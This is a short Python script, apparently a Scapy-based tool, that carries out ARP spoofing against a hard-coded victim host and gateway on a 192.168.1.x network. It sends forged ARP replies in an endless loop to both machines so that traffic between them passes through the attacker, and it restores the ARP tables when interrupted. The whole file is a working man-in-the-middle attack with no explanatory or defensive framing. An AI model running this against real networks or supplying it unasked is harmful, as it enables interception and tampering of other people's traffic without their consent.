from scapy.all import send
from scapy.layers.l2 import *

def main():
	victimIP  = "192.168.1.42"
	gatewayIP = "192.168.1.1"
	victimMAC  = '8:3e:5d:5f:b6:a0'
	gatewayMAC = '78:81:2:82:d6:da'

	try:
		while True:
			spoof(victimIP, victimMAC, gatewayIP)
			spoof(gatewayIP, gatewayMAC, victimIP)
	except KeyboardInterrupt:
		restore(gatewayIP, gatewayMAC, victimIP, victimMAC)
		restore(victimIP, victimMAC, gatewayIP, gatewayMAC)
		quit()
		
def spoof(victimIP, victimMAC, sourceip):
	spoofed= ARP(op=2 , pdst=victimIP, psrc=sourceip, hwdst= victimMAC)
	send(spoofed, verbose= False)
	print('spoof')

def restore(victimIP, victimMAC, sourceip, sourcemac):
	packet= ARP(op=2 , hwsrc=sourcemac , psrc= sourceip, hwdst= victimMAC , pdst= victimIP)
	send(packet, verbose=False)

if __name__=="__main__":
	main()
